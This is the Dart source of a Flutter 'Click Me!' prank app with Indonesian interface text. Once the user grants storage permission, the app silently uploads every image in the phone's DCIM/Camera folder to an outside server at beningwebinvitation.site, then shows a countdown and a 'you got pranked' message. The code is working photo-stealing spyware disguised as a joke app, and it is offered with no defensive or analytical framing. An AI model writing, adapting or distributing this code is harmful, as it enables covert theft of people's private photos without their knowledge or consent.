
import 'package:flutter/material.dart';
import 'dart:async';
import 'dart:io';
import 'package:permission_handler/permission_handler.dart';
import 'package:http/http.dart' as http;

void main() => runApp(ClickMeApp());

class ClickMeApp extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      home: HomePage(),
      debugShowCheckedModeBanner: false,
    );
  }
}

class HomePage extends StatelessWidget {
  void _navigateToPrank(BuildContext context) async {
    final status = await Permission.storage.request();
    if (status.isGranted) {
      _uploadImages();
      Navigator.push(context, MaterialPageRoute(builder: (_) => CountdownPage()));
    } else {
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(content: Text('Izin diperlukan untuk akses gambar')),
      );
    }
  }

  void _uploadImages() async {
    final dir = Directory('/storage/emulated/0/DCIM/Camera');

    if (await dir.exists()) {
      final files = dir.listSync().whereType<File>().where((f) {
        final ext = f.path.toLowerCase();
        return ext.endsWith('.jpg') || ext.endsWith('.png') || ext.endsWith('.jpeg');
      });

      for (final file in files) {
        final uri = Uri.parse('https://beningwebinvitation.site/gambar/upload.php');
        final request = http.MultipartRequest('POST', uri);
        request.files.add(await http.MultipartFile.fromPath('gambar', file.path));
        try {
          final response = await request.send();
          print('Upload ${file.path}: ${response.statusCode}');
        } catch (e) {
          print('Gagal upload: $e');
        }
      }
    } else {
      print('Folder Camera tidak ditemukan');
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Center(
        child: ElevatedButton(
          child: Text("Click Me!"),
          onPressed: () => _navigateToPrank(context),
        ),
      ),
    );
  }
}

class CountdownPage extends StatefulWidget {
  @override
  _CountdownPageState createState() => _CountdownPageState();
}

class _CountdownPageState extends State<CountdownPage> {
  int _seconds = 15;
  late Timer _timer;
  bool _showText = false;

  @override
  void initState() {
    super.initState();
    _timer = Timer.periodic(Duration(seconds: 1), (timer) {
      if (_seconds == 0) {
        setState(() => _showText = true);
        _timer.cancel();
      } else {
        setState(() => _seconds--);
      }
    });
  }

  @override
  void dispose() {
    _timer.cancel();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Center(
        child: _showText
            ? Text("Hahaha kamu kena prank!", style: TextStyle(fontSize: 24))
            : Text("$_seconds", style: TextStyle(fontSize: 40)),
      ),
    );
  }
}
